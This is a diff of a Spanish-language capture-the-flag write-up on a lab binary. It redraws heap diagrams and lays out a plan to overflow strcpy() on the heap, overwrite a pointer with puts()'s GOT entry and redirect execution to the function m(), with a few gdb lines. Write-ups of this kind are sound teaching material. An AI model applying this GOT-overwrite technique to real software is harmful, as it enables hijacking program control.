@@ -49,20 +49,23 @@
 
   Dejando el heap así:
 
-  Heap:
-  |-----------------------|   <---- Dirección más baja
-  |   malloc(8) para `a`  |   -> Reserva 8 bytes para `a[0]` y `a[1]`
-  |   a[0] = 1            |   -> Contiene el valor `1`
-  |   a[1] = dirección    |   -> Apunta a la nueva reserva de `malloc(8)` para `a[1]`
-  |-----------------------|
-  | malloc(8) para `a[1]` |   -> Reserva 8 bytes más (para dos enteros de 32 bits)
-  |-----------------------|
-  |   malloc(8) para `b`  |   -> Reserva 8 bytes para `b[0]` y `b[1]`
-  |   b[0] = 1            |   -> Contiene el valor `1`
-  |   b[1] = dirección    |   -> Apunta a la nueva reserva de `malloc(8)` para `b[1]`
+  High adr
+  -------------------------
+  | HEAP                  |
   |-----------------------|
   | malloc(8) para `b[1]` |   -> Reserva 8 bytes más (para dos enteros de 32 bits)
-  |-----------------------|   <---- Dirección más alta
+  |-----------------------|  
+  |   b[1] = dirección    |   -> Apunta a la nueva reserva de `malloc(8)` para `b[1]`
+  |   b[0] = 1            |   -> Contiene el valor `1`
+  |   malloc(8) para `b`  |   -> Reserva 8 bytes para `b[0]` y `b[1]`
+  |-----------------------|   
+  | malloc(8) para `a[1]` |   -> Reserva 8 bytes más (para dos enteros de 32 bits)
+  |-----------------------|
+  |   a[1] = dirección    |   -> Apunta a la nueva reserva de `malloc(8)` para `a[1]`
+  |   a[0] = 1            |   -> Contiene el valor `1`
+  |   malloc(8) para `a`  |   -> Reserva 8 bytes para `a[0]` y `a[1]`
+  |-----------------------|
+  Low adr
 
 5.- Más adelante en main() vemos que hace dos strcpy() de argv[1] y argv[2] sobre los puenteros a[1] y b[1]
   [...]
@@ -110,7 +113,8 @@
   0x0804851a <+38>:	call   0x80483b0 <printf@plt>
   [...]
 
-9.- El plan es hacer un heap overflow en el primer strcpy() para que sobreescliba b[1] con la dirección GOT del puts() y a continucación hacer ortro heap overflow en el segundo strcpy() para insertar la dirección de m() para que se ejecute
+9.- El plan es hacer un heap overflow en el primer strcpy() para que sobreescliba b[1] con la dirección GOT del puts() 
+    y a continucación hacer ortro heap overflow en el segundo strcpy() para insertar la dirección de m() para que se ejecute.
 
 10.- Primero necesitamos saber cuanto es el offset que necesitamos para escribir b[1]
   (gdb) b *0x080485bd ; Ponemos un breakpoint en el segundo strcpy()
@@ -135,6 +139,19 @@
      0x0804840b <+11>:	jmp    0x80483a0
   End of assembler dump.  
   [...]
+
+  High adr
+  -------------------------
+  | HEAP                  |
+  |-----------------------|  
+  |   b[1] =  0x8049928   |   -> strcpy(adr GOT puts, adr m())
+  |   b[0] = ...AAAA...   |  
+  |          ...          |
+  |-----------------------|   
+  |   a[1] = AAAA...      |   -> strcpy(a[1], "A"*20 + adr GOT puts())
+  |   a[0] = 1            |   
+  |-----------------------|
+  Low adr
 
 12.- Montamos dos payloads uno para cada argv
   #Python3.7.2
